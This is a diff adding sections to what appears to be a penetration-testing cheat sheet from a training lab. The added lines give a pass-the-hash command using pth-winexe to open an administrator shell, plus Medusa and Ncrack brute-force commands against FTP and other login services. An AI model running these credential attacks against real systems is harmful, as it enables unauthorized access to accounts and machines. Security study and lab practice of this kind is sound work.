@@ -269,6 +269,25 @@ On attacker machine:
 On victim machine:
 
 	Paste the content of <[FILE.txt]>
+	
+# Privilege Escalation
+
+# Pass the hash
+
+	Export SMBHASH=<[HASH]>
+	
+	pth-winexe -U administrator% //<[IP]> cmd
+	
+# Cracking
+
+<b>Medusa</b>
+
+	medusa -h 10.11.1.227 -U lab-users.txt -P lab-passwords.txt -M ftp | grep "ACCOUNT FOUND"
+
+<b>Ncrack</b> (FTP, SSH, TELNET, HTTP(S), POP3(S), SMB, RDP, VNC)
+
+	ncrack -U <[USERS_LIST]> -P <[PASSWORDS_LIST]> ftp://<[IP]>
+
 
 
 
